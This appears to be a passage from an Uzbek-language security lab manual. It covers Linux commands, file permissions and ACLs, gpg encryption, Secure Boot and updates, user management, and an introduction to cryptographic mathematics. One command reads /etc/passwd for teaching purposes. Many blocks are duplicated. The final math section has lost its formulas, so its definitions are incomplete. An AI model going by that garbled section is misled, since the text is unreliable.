+	•	Joriy direktoriyani ko‘rsatish: “pwd” buyrug‘ini kiriting (Print Working Directory). Bu siz qaysi papkada ekanligingizni ko‘rsatadi.
+	•	Direktoriyalar ro‘yxatini ko‘rish: “ls” buyrug‘ini kiriting (List). Bu joriy papkadagi fayl va papkalarni ko‘rsatadi. “ls -l” varianti batafsil ma’lumot (fayl o‘lchami, ruxsatlar) beradi. “ls -a” yashirin fayllarni ham ko‘rsatadi.
+	•	Direktoriyani o‘zgartirish: “cd Desktop” buyrug‘ini kiriting (Change Directory) – bu Desktop papkasiga o‘tkazadi. “cd ..” orqaga qaytadi, “cd ~” uy papkasiga olib boradi (3.1-rasm).
+
+3.1-rasm. Direktoriyalar bilan ishlash buyruqlari
+Papka va fayllarni yaratish va o‘chirish. Yangi elementlar qo‘shish va olib tashlash uchun:
+	•	Papka yaratish: “mkdir test_folder” buyrug‘ini kiriting (Make Directory) – bu “test_folder” nomli yangi papka yaratadi. “ls” bilan natijani tekshiring.
+	•	Fayl yaratish: “touch test_file.txt” buyrug‘ini kiriting – bu bo‘sh fayl yaratadi. “echo ‘Salom, Linux!’ > test_file.txt” buyrug‘ini kiriting – bu faylga matn yozadi (echo – matn chiqarish buyruqi).
+	•	Fayl mazmunini ko‘rish: “cat test_file.txt” buyrug‘ini kiriting (Concatenate) – fayl mazmunini ekranga chiqaradi.
+	•	Faylni ko‘chirish yoki nomini o‘zgartirish: “mv test_file.txt new_file.txt” buyrug‘ini kiriting (Move) – bu fayl nomini o‘zgartiradi. “mv new_file.txt test_folder/” boshqa papkaga ko‘chiradi (3.2-rasm).
+	•	Faylni nusxalash: “cp new_file.txt copy_file.txt” buyrug‘ini kiriting (Copy) – bu fayldan nusxa yaratadi.
+	•	O‘chirish: “rm copy_file.txt” buyrug‘ini kiriting (Remove) – faylni o‘chiradi. “rm -r test_folder” papkani va ichidagi fayllarni o‘chiradi (-r – recursive, ya’ni ichki elementlar bilan) (3.3-rasm).
+
+3.2-rasm. Papka va fayllarni yaratish va o‘chirish buyruqlari
+
+3.3-rasm. Papka va fayllarni yaratish va o‘chirish buyruqlari (davomi)
+Administrativ buyruqlar va paket boshqaruvi. Tizimni yangilash va o‘rnatish uchun sudo (Super User Do) ishlatiladi – bu administrator huquqlarini beradi:
+	•	Tizimni yangilash: “sudo apt update” buyrug‘ini kiriting – paketlar ro‘yxatini yangilaydi (parolni kiriting). Keyin “sudo apt upgrade” – paketlarni yangilaydi.
+
+3.4-rasm. Administrativ buyruqlar va paket boshqaruvi
+	•	Yangi paket o‘rnatish: “sudo apt install nano” buyrug‘ini kiriting – bunda nano matn muharriri o‘rnatiladi (3.4-rasm). “nano test_file.txt” bilan faylni tahrirlash mumkin (Ctrl+O saqlash, Ctrl+X chiqish) (3.5-rasm).
+	•	Paketni olib tashlash: “sudo apt remove nano” – paketni o‘chiradi.
+	•	Tizim ma’lumotini ko‘rish: “uname -a” – kernel versiyasini ko‘rsatadi, “df -h” – disk joyini, “free -h” – RAM holatini ko‘rsatadi (3.6-rasm).
+
+3.5-rasm. Faylni tahrirlash oynasi
+
+3.6-rasm. Administrativ buyruqlar va paket boshqaruvi (davomi)
+Buyruqlar kombinatsiyasi va yordam olish. Buyruqlarni birlashtirish uchun “|” (pipe) ishlatiladi:
+	•	Misol: “ls -l | grep txt” – ls natijasidan “txt” so‘zini qidiradi (grep – qidiruv buyruqi).
+	•	Yordam olish: “man ls” – ls buyrug‘ining qo‘llanmasini ochadi (Manual). “exit” bilan chiqing. Yoki “ls –help” – qisqa yordam olish uchun ishlatiladi.
+	•	Oldingiz buyruqlar tarixni ko‘rish: “history” – oldingi buyruqlarni ko‘rsatadi (3.7-rasm).
+
+3.7-rasm. Buyruqlar kombinatsiyasi va yordam olish
+		Laboratoriya muhitida Ubuntu OTni virtual mashinada sozlab, 5 ta papka va 3 ta fayl yarating, ularni ko‘chiring va o‘chiring.
+	•	Sudo bilan paket o‘rnating (masalan, tree) va tizim ma’lumotlarini jadvalda ko‘rsating.
+	•	Barcha buyruqlar natijalarini .txt faylga saqlab (masalan, echo orqali), skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Ubuntu OTni virtual mashinada sozlab, 5 ta papka va 3 ta fayl yarating, ularni ko‘chiring va o‘chiring.
+	•	Sudo bilan paket o‘rnating (masalan, tree) va tizim ma’lumotlarini jadvalda ko‘rsating.
+	•	Barcha buyruqlar natijalarini .txt faylga saqlab (masalan, echo orqali), skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+3.2. Fayl tizimlari va foydalanishlarni boshqarish
+O‘quvchilarda Linux OTda faylni boshqarishga oid imtiyozlarni o‘zgartirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda Linux OTda faylni boshqarishga oid imtiyozlarni o‘zgartirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal oynasi.
+
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal oynasi.
+
+Ishning bajarish tartibi
+Linux operatsion tizimida fayl va papka imtiyozlari (permissions) tizim xavfsizligini ta’minlaydi. Imtiyozlar foydalanuvchi (user), guruh (group) va boshqalar (others) uchun o‘qish (read - r), yozish (write - w) va bajarish (execute - x) huquqlarini belgilaydi. Ushbu laboratoriya ishida virtual muhitda Linux (Ubuntu) OTda fayl imtiyozlarini o‘zgartirish, egasi va guruhini boshqarish, umask va ACL (Access Control Lists) ni amalga oshirish masalasi ko‘rib chiqiladi. Bu ko‘nikmalar Linux OTda fayl xavfsizligini boshqarishning asosini tashkil etadi va real hayotda server boshqaruvi, dasturiy ta’minot rivojlantirish va ma’lumot himoyasida muhim hisoblanadi.
+Linux OTda har bir fayl va katalog quyidagi imtiyozlarga ega:
+3.5-jadval
+Ruxsat turlari (permissions)
+Buyruq
+Ma’nosi
+Vazifasi
+r
+read
+O‘qish huquqini berish
+w
+write
+Yozish huquqini berish
+x
+execute
+Bajarish huquqini berish
+
+
+3.6-jadval
+Raqamli (octal) formatda
+Ruxsat
+Raqam
+r
+4
+w
+2
+x
+1
+Masalan:
+	•	rwx = 7;
+	•	rw- = 6;
+	•	r-- = 4.
+Fayl imtiyozlari: 764 ⇒
+	•	user: 7 (rwx);
+	•	group: 6 (rw-);
+	•	others: 4 (r--).
+Imtiyozlarni ko‘rish va asosiy buyruqlar. Fayl imtiyozlarini ko‘rish uchun “ls -l” ishlatiladi. Bu ruxsatlar, egasi, guruh va fayl nomini ko‘rsatadi (masalan, -rw-r--r-- user users file.txt):
+	•	Test fayllari yaratish: “mkdir test_dir” (papka yaratish), “touch test_file.txt” (fayl yaratish), “echo ‘Test matn’ > test_file.txt” (faylga matn yozish).
+	•	Imtiyozlarni ko‘rish: “ls -l” buyrug‘ini kiriting. Natijada birinchi qism imtiyozlarni ko‘rsatadi: d (papka uchun) yoki (fayl uchun), keyin rwx foydalanuvchi uchun, rwx guruh uchun, rwx boshqalar uchun. Masalan, -rw-r--r--: egasi o‘qiydi va yoza oladi, guruh va boshqalar faqat o‘qiy oladi.
+	•	Joriy umaskni ko‘rish: “umask” buyrug‘ini kiritiladi. Bu yangi fayllar uchun standart imtiyozlarni belgilaydi (masalan, 0002, ya’ni fayllar uchun 644, papkalar uchun 755). Umaskni o‘zgartirish: “umask 0077” (faqat egasi uchun huquqlar) va yangi fayl yaratish, natijani “ls -l” bilan tekshirish lozim (3.8-rasm).
+Imtiyozlarni o‘zgartirish (chmod). Chmod buyrug‘i imtiyozlarni raqamli (octal) yoki simvolik rejimda o‘zgartiradi:
+	•	Raqamli rejim: r=4, w=2, x=1. Masalan, “chmod 755 test_file.txt” buyrug‘i egasi uchun rwx (7=4+2+1), guruh va boshqalar uchun rx (5=4+1) ruxsatini beradi. Buni “ls -l” buyrug‘i bilan tekshirish mumkin
+	•	Belgili rejim: “chmod u+x test_file.txt” (u – user/egasi, +x – execute qo‘shish). “chmod g-w test_dir” (g – group, -w – write olib tashlash). “chmod o=r test_file.txt” (o – others, =r – faqat read berish).
+
+3.8-rasm. Fayllarning imtiyozlarini ko‘rish
+	•	Rekursiv o‘zgartirish: “chmod -R 700 test_dir” (papka va ichidagilar uchun). Agar “chmod” buyrug‘i ishlatilishida xatolik bersa, sudo bilan ishlatib ko‘ring (3.9-rasm).
+Egasi va guruhini o‘zgartirish (chown, chgrp). Fayl egasi va guruhini boshqarish uchun:
+	•	Yangi foydalanuvchi yarating (test uchun): “sudo adduser testuser” (yangi foydalanuvchi yaratish, parol va ma’lumotlarni kiriting).
+Egasi o‘zgartirish: “sudo chown testuser test_file.txt” – fayl egasini testuserga o‘tkazadi. Natijani “ls -l” bilan tekshiring (3.10-rasm).
+	•	Guruh o‘zgartirish: “sudo chgrp users test_file.txt” (guruhni users ga o‘zgartirish). Bir vaqtda egasi va guruh: “sudo chown testuser:users test_file.txt”.
+	•	Rekursiv: “sudo chown -R testuser:users test_dir”. Eski holatga qaytarish uchun o‘z foydalanuvchingiz nomini ishlatib chown buyrug‘ini bajaring (3.11-rasm).
+
+3.9-rasm. Imtiyozlarni o‘zgartirish
+Kengaytirilgan imtiyozlar (ACL). Standart imtiyozlarga qo‘shimcha huquqlar berish uchun ACL ishlatiladi:
+	•	ACL ni yoqing (agar kerak bo‘lsa): Tizimda ACL o‘rnatilgan bo‘lsa, davom eting.
+	•	ACL ni ko‘rish: “getfacl test_file.txt” – joriy ACL ni ko‘rsatadi.
+	•	ACL qo‘shish: “setfacl -m u:testuser:rw test_file.txt” (testuser ga read va write berish). “setfacl -m g:users:rx test_dir” (guruhga read va execute).
+	•	ACL ni olib tashlash: “setfacl -x u:testuser test_file.txt” (huquqni olib tashlash). “setfacl -b test_file.txt” (barcha ACL ni tozalash).
+	•	Rekursiv: “setfacl -R -m u:testuser:rw test_dir”. Natijalarni “getfacl” bilan tekshiring (3.12-rasm).
+
+3.10-rasm. Yangi foydalanuvchi yaratish va egasini o‘rgartirish
+
+3.11-rasm. Fayl egasi va guruhini boshqarish
+Natijalarni tekshirish va xatolar. Har bir o‘zgartirishdan keyin “ls -l” va “getfacl” ishlatib natijani tekshiring. Sinash uchun “cat test_file.txt” (o‘qish), “echo “Yangi matn” >> test_file.txt” (yozish), “./test_file.txt” (agar script bo‘lsa, bajarish). Agar “Permission denied” chiqsa, imtiyozlar noto‘g‘ri, ularni qayta sozlang. Izoh: sudo bilan tizim fayllarini o‘zgartirmang, faqat test fayllari bilan ishlang.
+
+3.12-rasm. Kengaytirilgan imtiyozlar (ACL)
+		Laboratoriya muhitida Ubuntu OTni virtual mashinada sozlab, 3 ta fayl va 2 ta papka yarating, ularning imtiyozlarini chmod bilan o‘zgartiring.
+	•	Yangi foydalanuvchi yaratib, chown/chgrp bilan egasi va guruhini o‘zgartiring, ACL bilan qo‘shimcha huquqlar qo‘shing va natijalarni jadvalda ko‘rsating.
+	•	Barcha buyruqlar natijalarini (ls -l, getfacl bilan ko‘rib) .txt faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Ubuntu OTni virtual mashinada sozlab, 3 ta fayl va 2 ta papka yarating, ularning imtiyozlarini chmod bilan o‘zgartiring.
+	•	Yangi foydalanuvchi yaratib, chown/chgrp bilan egasi va guruhini o‘zgartiring, ACL bilan qo‘shimcha huquqlar qo‘shing va natijalarni jadvalda ko‘rsating.
+	•	Barcha buyruqlar natijalarini (ls -l, getfacl bilan ko‘rib) .txt faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+3.3. Operatsion tizim jurnallari va auditlash
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda operatsion tizimda mavjud vositalar yordamida fayllarni shifrlash/ deshifrlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda operatsion tizimda mavjud vositalar yordamida fayllarni shifrlash/ deshifrlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal oynasi.
+
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal oynasi.
+
+Ishning bajarish tartibi
+Fayllarni shifrlash maxfiylikni ta’minlashga xizmat qiladi. Ushbu laboratoriya ishida Ubuntu Linux OTda mavjud gpg (GnuPG) vositasi yordamida simmetrik va assimetrik shifrlash/ deshifrlashni amalga oshirish masalasi ko‘rib chiqiladi. Gpg ochiq kodli va xavfsiz shifrlash standartlarini qo‘llab-quvvatlaydi. Bu ko‘nikmalar real hayotda maxfiy fayllarni saqlash, uzatish va himoya qilishda muhim hisoblanadi.
+Terminalni ochish uchun Ctrl+Alt+T tugmalarini bosing yoki Applications menyusidan “Terminal” ni qidiring. Barcha buyruqlar oddiy foydalanuvchi sifatida bajariladi. Agar kerak bo‘lsa sudo administrator huquqlari beriladi.
+Kalit juftini yaratish (assimetrik shifrlash uchun). Assimetrik shifrlash ochiq (public) va shaxsiy (private) kalitlardan foydalanadi:
+	•	Terminalda “gpg --full-generate-key” buyrug‘ini kiriting. “Key type” bandini tanlang (odatiy RSA), talab etilgan kalit uzunligi, “key length” (3072 yoki 4096 bit), ism va emailni kiriting (masalan, ism: “Test User”, email: “test@example.com”) (3.13-rasm).
+	•	Kalitni himoya qilish uchun parolni kiriting (masalan, “secretpass”) (3.14-rasm). Jarayon so‘ngida kalitlar hosil qilinadi. Kalitlarni ko‘rish uchun “gpg --list-keys” buyrug‘ini kiritish talab etiladi.
+	•	Ochiq kalitni eksport qilish: “gpg --armor --export test@example.com > public.key” (boshqa foydalanuvchiga yuborish uchun) buyrug‘idan foydalaniladi (3.15-rasm).
+
+3.13-rasm. RSA shifrlash algoritmi uchun kalit juftligini yaratish
+
+3.14-rasm. Parolni kiritish
+
+3.15-rasm. Ochiq kalitni eksport qilish
+Faylni assimetrik shifrlash algoritmi bilan himoyalash. Test fayl yarating va uni shifrlash quyidagicha amalga oshiriladi:
+	•	Fayl yaratish: “echo ‘Maxfiy ma’lumot’ > secret.txt” buyrug‘ini kiriting.
+	•	Shifrlash: “gpg --encrypt --recipient test@example.com secret.txt” buyrug‘ini kiritish va natijada “secret.txt.gpg” nomli shifrlangan fayl yaratiladi (bu yerda, recipient – ochiq kalit egasi).
+	•	Shifrlangan fayl mazmunini ko‘ring: “cat secret.txt.gpg” buyrug‘i bilan shifrlangan matnni ko‘rish mumkin (3.16-rasm).
+
+3.16-rasm. Faylni assimetrik shifrlash
+Faylni deshifrlash. Shifrlangan faylni ochish uchun quyidagi ketma-ketliklar bajariladi:
+	•	Deshifrlash: “gpg --decrypt secret.txt.gpg > decrypted.txt” buyrug‘ini kiriting. Kalitdan foydalanish uchun parolni kiriting (masalan, “secretpass”).
+	•	Natijani tekshiring: “cat decrypted.txt” buyrug‘i bilan asl matnni ko‘rish mumkin (mazkur holda, “Maxfiy ma’lumot” matnini) (3.17-rasm).
+
+3.17-rasm. Faylni deshifrlash
+Simmetrik shifrlash (parol bilan). Simmetrik shifrlashda bitta kalit (parol)dan foydalanadi va u quyidagicha amalga oshiriladi:
+	•	Shifrlash: “gpg --symmetric secret.txt” buyrug‘ini kiriting (3.18-rasm).
+Parolni takror kiriting (masalan, “sympass”) (3.19-rasm). Natijada “secret.txt.gpg” fayli yaratiladi.
+	•	Deshifrlash: “gpg --decrypt secret.txt.gpg > sym_decrypted.txt” buyrug‘ini va parolni kiriting.
+	•	Natijani ko‘ring: “cat sym_decrypted.txt” buyrug‘ini kiritib, asl matn ko‘ring (3.20-rasm).
+
+3.18-rasm. Simmetrik shifrlash
+
+3.19-rasm. Simmetrik parolni kiritish
+
+3.20-rasm. Shifrmatnni deshifrlash va natijani tekshirish
+		Laboratoriya muhitida Ubuntu OTni virtual mashinada o‘rnatib, kalit juftligini yarating va test faylni assimetrik algoritmlar bilan shifrlang/ deshifrlang.
+	•	Simmetrik shifrlashni amalga oshiring va natijalarni jadvalda ko‘rsating (asl fayl, shifrlangan, deshifrlangan).
+	•	Barcha buyruqlar natijalarini .txt faylga saqlab, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Ubuntu OTni virtual mashinada o‘rnatib, kalit juftligini yarating va test faylni assimetrik algoritmlar bilan shifrlang/ deshifrlang.
+	•	Simmetrik shifrlashni amalga oshiring va natijalarni jadvalda ko‘rsating (asl fayl, shifrlangan, deshifrlangan).
+	•	Barcha buyruqlar natijalarini .txt faylga saqlab, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+3.4. Secure Boot va tizim yangilanishlari
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda BIOS xavfsizligi va yangilanishlarning ahamiyatini o‘rgatish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda BIOS xavfsizligi va yangilanishlarning ahamiyatini o‘rgatish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	BIOS/UEFI ga kirish imkoniyati;
+	•	Windows yoki Linux o‘rnatilgan tizim;
+	•	Internet (yangilanishlarni tekshirish uchun).
+
+	•	Shaxsiy kompyuter;
+	•	BIOS/UEFI ga kirish imkoniyati;
+	•	Windows yoki Linux o‘rnatilgan tizim;
+	•	Internet (yangilanishlarni tekshirish uchun).
+
+Ishning bajarish tartibi
+Xavfsiz yuklanish (Secure Boot) UEFI/BIOS tizimida zararli dasturlardan himoya qiluvchi xavfsizlik funksiyasi bo‘lib, u faqat tasdiqlangan dasturlarning yuklanishiga ruxsat beradi. Yangilanishlar (updates) esa BIOS/UEFI firmware va operatsion tizim zaifliklarini bartaraf etib, tizim xavfsizligini oshiradi. Ushbu laboratoriya ishida virtual muhitda Windows 10/11 OTda Secure Boot funksiyasini yoqish va firmware/OT yangilanishlarini amalga oshirish ko‘rib chiqiladi. Bu ko‘nikmalar real hayotda tizim himoyasini ta’minlashda muhim hisoblanadi. Izoh: real kompyuterlarda BIOS o‘zgartirish xavfli bo‘lishi mumkin, shuning uchun virtual muhitda tajriba o‘tkazish tavsiya etiladi.
+BIOS - kompyuter ishga tushishidagi birinchi dastur hisoblanadi. UEFI esa BIOS tizimining zamonaviy va xavfsizroq turidir.
+Ushbu tizimdagi yangilanishlar quyidagilarga imkon beradi:
+	•	xavfsizlikka oid xatolarni yopadi;
+	•	yangi hujumlardan himoya qiladi;
+	•	tizim barqarorligini oshiradi.
+Yangilanmagan BIOS yoki tizim esa potensial xavf hisoblanadi.
+1. BIOS/UEFI ga kirish va Secure Boot rejimini yoqish. Secure Boot rejimi zararli bootkit va rootkitlardan himoya qiladi. Buning uchun kompyuterni o‘chirish va qayta yoqish talab etiladi. Yoqish vaqtida quyidagi tugmalardan birini takror bosish talab etiladi:
+	•	F2 (yoki Fn+F2);
+	•	DEL;
+	•	ESC;
+	•	F10 (kompyuter turiga bog‘liq).
+Keyin BIOS/UEFI menyusi ochiladi (3.21-rasm).
+
+3.21-rasm. BIOS/UEFI oynasiga kirish
+2. “Boot” yoki “Xavfsizlik (Security)” bo‘limiga o‘ting. “Secure Boot” bandini toping va uni “Yoqilgan (Enabled)” ko‘rinishga o‘zgartiring. Agar “Secure Boot Mode” bo‘lsa, undan “Standard” bandini tanlang (Microsoft kalitlari bilan) (3.22-rasm):
+	•	Enabled → Secure Boot yoqilgan (xavfsiz).
+	•	Disabled → Secure Boot o‘chirilgan (xavf yuqori).
+Bu orqali kompyuterning boshlang‘ich himoya holatini o‘rnatish mumkin.
+3. BIOS/UEFI parolini tekshirish. BIOS tizimining “Security” bo‘limidan
+	•	administrator paroli;
+	•	supervisor paroli bor-yo‘qligi tekshiriladi.
+Parolsiz BIOS sharoitida, har kim sozlanmalarni o‘zgartirishi mumkin. Bu esa xavfsizlikka jiddiy tahdid hisoblanadi (3.23-rasm).
+
+3.22-rasm. Secure Boot rejimini yoqish
+
+3.23-rasm. BIOS/UEFI rejimi uchun parol qo‘yish
+4. BIOS/UEFI yangilanishlarini tekshirish va o‘rnatish. Firmware yangilanishlari zaifliklarni (masalan, UEFI hujumlarini) oldini oladi va xavfsizlik darajasini yaxshilaydi:
+	•	Buning uchun Windows OTda “SettingsUpdate & SecurityWindows Update” ga kiring va “View optional updates” bandini bosing. Agar mavjud bo‘lsa, “Driver updates” bo‘limida firmware yangilanishlari (masalan, BIOS uchun) paydo bo‘lishi mumkin (3.24-rasm).
+	•	Agar mavjud bo‘lsa, ularni o‘rnatish va tizimni qayta yuklash talab etiladi. Alternativ usulda esa, kompyuter ishlab chiqaruvchisi (masalan, Dell, HP) saytidan BIOS tizimining yangi versiyasini yuklab, administrator sifatida uni o‘rnatish mumkin (virtual muhitda test uchun).
+	•	Natijani tekshirish: “msinfo32” buyrug‘i yordamida “BIOS Version/Date” bandini qarash orqali, tizim yangilanganini ko‘rish mumkin (agar muvaffaqiyatli o‘rnatilsa, yangi versiya paydo bo‘lishi kerak) (3.25-rasm).
+
+3.24-rasm. BIOS/UEFI yangilanishlarini tekshirish
+
+3.25-rasm. BIOS/UEFI versiyasini aniqlash
+5. Operatsion tizim yangilanishlarini amalga oshirish. OT yangilanishlari BIOS zaifliklarini to‘ldirib, muhim ahamiyat kasb etadi. Buni amalga oshirish uchun quyidagi ketma-ketlikdagi ishlar amalga oshiriladi:
+	•	Windows OTda “Settings Update & Security Windows Update” bo‘limiga kiring va “Check for updates” tugmasini bosing. Agar mavjud bo‘lsa, yangilanishlarni yuklab o‘rnating va OTni qayta yuklang (3.26-rasm).
+	•	Qo‘shimcha: “wmic qfe list” buyrug‘ini cmd yordamida kiritib, o‘rnatilgan yangilanishlar ro‘yxatini ko‘rish mumkin.
+	•	Natijani tekshirish: “winver” buyrug‘ini cmd yordamida kiritib, Windows OT versiyasini ko‘rish mumkin (3.27-rasm).
+
+
+3.26-rasm. Operatsion tizim yangilanishlarini amalga oshirish
+
+3.27-rasm. Windows OT versiyasini ko‘rish
+		Laboratoriya muhitida Secure Boot funksiyasini yoqing va uni sinab ko‘ring.
+	•	Operatsion tizim yangilanishlarini amalga oshiring.
+	•	Yangilanishlardan oldingi/keyingi holatlarni faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Secure Boot funksiyasini yoqing va uni sinab ko‘ring.
+	•	Operatsion tizim yangilanishlarini amalga oshiring.
+	•	Yangilanishlardan oldingi/keyingi holatlarni faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+3.5. Foydalanuvchi qayd yozuvi va parollar siyosati
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda foydalanuvchilarni yaratish va parol siyosatini o‘rnatish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda foydalanuvchilarni yaratish va parol siyosatini o‘rnatish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal ilovasi.
+
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal ilovasi.
+
+Ishning bajarish tartibi
+Linux operatsion tizimida foydalanuvchilar, guruhlar va ruxsatlar — tizimning eng asosiy xavfsizlik va boshqaruv mexanizmlaridan hisoblanadi. Har bir jarayon, xizmat, dastur aynan biror foydalanuvchi nomidan bajariladi. Shu sababdan foydalanuvchilarni to‘g‘ri boshqarish nafaqat qulaylik, balki xavfsizlik nuqtai nazaridan ham muhim hisoblanadi.
+Linux OTda foydalanuvchi boshqaruvi quyidagi buyruqlar orqali amalga oshiriladi:
+3.7-jadval
+Foydalanuvchi boshqaruvi buyruqlari
+Buyruq
+Vazifasi
+useradd
+Yangi foydalanuvchi yaratish;
+passwd
+Foydalanuvchi akkuntiga parol o‘rnatish;
+usermod
+Foydalanuvchi parametrlarini o‘zgartirish;
+userdel
+Foydalanuvchini o‘chirish.
+Amaliy qismni bajarish ketma-ketligi:
+1. Ubuntu OTda terminalga kirish. Ubuntu OTda terminaldan foydalanish uchun ilovalar menyusidan terminalga kiriladi yoki ALT+CTRL+T tugmalari birgalikda bosiladi.
+3.28-rasm. Ubuntu OTning terminal oynasi
+3.29-rasm. Student nomli foydalanuvchi yaratish
+2. Foydalanuvchi yaratish. Linux OTda yangi foydalanuvchi yaratish uchun useradd buyrug‘i ishlatiladi.
+3. Yaratilgan foydalanuvchi akkauntiga parol qo‘yish. Linux OTda yaratilgan foydalanuvchiga passwd buyrug‘i parol o‘rnatadi. Linux OT parollarni /etc/shadow faylida shifrlangan holda saqlaydi.
+3.30-rasm. Yaratilgan foydalanuvchi akkauntiga parol qo‘yish
+Linux operatsion tizimida foydalanuvchiga parollar qo‘yilayotganda terilayotgan parol foydalanuvchiga ko‘rinmaydi. Bu ham operatsion tizimning xavfsizligi yuqori ekanligiga misol bo‘la oladi.
+4. Foydalanuvchilar ro‘yxatini ko‘rish. Linux tizimidagi barcha foydalanuvchilar ro‘yxati /etc/passwd faylida saqlanadi. Bu fayl tizimdagi har bir foydalanuvchi haqida asosiy ma’lumotlarni o‘z ichiga oladi.
+cut -d: -f1 /etc/passwd - bu buyruq faqat foydalanuvchi nomlarini chiqaradi.
+5. Foydalanuvchini o‘chirish. Linux OTda foydalanuvchilarni o‘chirish sudo userdel -r student buyrug‘i orqali amalga oshiriladi.
+3.31-rasm. Foydalanuvchilar ro‘yxati
+3.32-rasm. Student va talaba nomli foydalanuvchilarni o‘chirish
+		Laboratoriya muhitida Ubuntu virtual mashinasini sozlab, 2 ta foydalanuvchi yarating: userA, userB.
+	•	developers nomli guruh yarating va ikkala foydalanuvchini ushbu guruhga qo‘shing.
+	•	Barcha buyruqlar natijalarini .txt faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Ubuntu virtual mashinasini sozlab, 2 ta foydalanuvchi yarating: userA, userB.
+	•	developers nomli guruh yarating va ikkala foydalanuvchini ushbu guruhga qo‘shing.
+	•	Barcha buyruqlar natijalarini .txt faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+
+
+4-bob haqida umumiy ma’lumot
+Mazkur bobda kriptografiyaning asosiy tushunchalari, bo‘limlari, simmetrik va ochiq kalitli shifrlash algoritmlari, xesh funksiyalar, elektron raqamli imzo algoritmlari, ularning axborot xavfsizligini ta’minlashdagi ahamiyati, shuningdek, HTTPS protokoli va SSL/TLS sertifikatlarini tahlil qilish, parollarni himoyalash va ularning barcha mumkin bo‘lgan variantlarini hisoblash orqali parol xavfsizligini baholash kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.
+4.1. Kriptografiyaga kirish
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda kriptografik algoritmlarda foydalanilgan fundamental matematik bilimlarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda kriptografik algoritmlarda foydalanilgan fundamental matematik bilimlarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Python dasturlash muhiti;
+	•	Brauzer oynasi.
+
+	•	Shaxsiy kompyuter;
+	•	Python dasturlash muhiti;
+	•	Brauzer oynasi.
+
+Ishning bajarish tartibi
+Natural sonlar to‘plamini  va butun sonlar to‘plamini  ko‘rinishda belgilaymiz. 
+Noldan farqli bo‘lgan  soni va  sonlar  –to‘plamga tegishli, ya’ni  bo‘lib,  bo‘lsin. Agarda shunday  soni mavjud bo‘lib,  tenglik bajarilsa, u holda,  soni  sonini bo‘ladi deyiladi.
+Berilgan  va  sonlarni bo‘luvchi butun son, ularning umumiy bo‘luvchisi deyiladi. Umumiy bo‘luvchilar ichida eng kattasi eng katta umumiy bo‘luvchi  deyiladi va  ko‘rinishda belgilanadi. Agarda  va  sonlarning eng katta umumiy bo‘luchisi  bo‘lsa, a va b sonlar o‘zaro tub deyiladi.
+Berilgan natural son  tub deyiladi, agarda bu son o‘zi  va  dan boshqa natural songa bo‘linmasa. 
+Misol uchun: 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, tub sonlar, ular sanoqli va cheksiz sondagi to‘plamni tashkil etadi. Kelgusida, barcha butun sonlarni modul (xarakteristika) deb ataluvchi biror fiksirlangan natural  soniga bo‘lganda qoladigan qoldiqlar bilan bog‘liq holda qaraymiz. Bunda cheksiz quvvatli (elementlari soni cheksiz) bo‘lgan barcha butun sonlar to‘plamiga,  dan  gacha bo‘lgan butun sonlarni o‘z ichiga oladigan chekli, quvvati  ga teng bo‘lgan  to‘plam mos qo‘yiladi. 
+Bu quyidagicha amalga oshiriladi:  va –natural sonlar bo‘lsa, “ sonini soniga qoldiq bilan bo‘lish”, deganda ushbu , bu yerda  shartni qanoatlantiruvchi natural  va sonlarini topish tushuniladi. Bu oxirgi tenglikda qoldiq deb ataluvchi  soni nolga teng bo‘lsa, , natural  soni  soniga bo‘linadi yoki  soni  sonining bo‘luvchisi deyiladi.
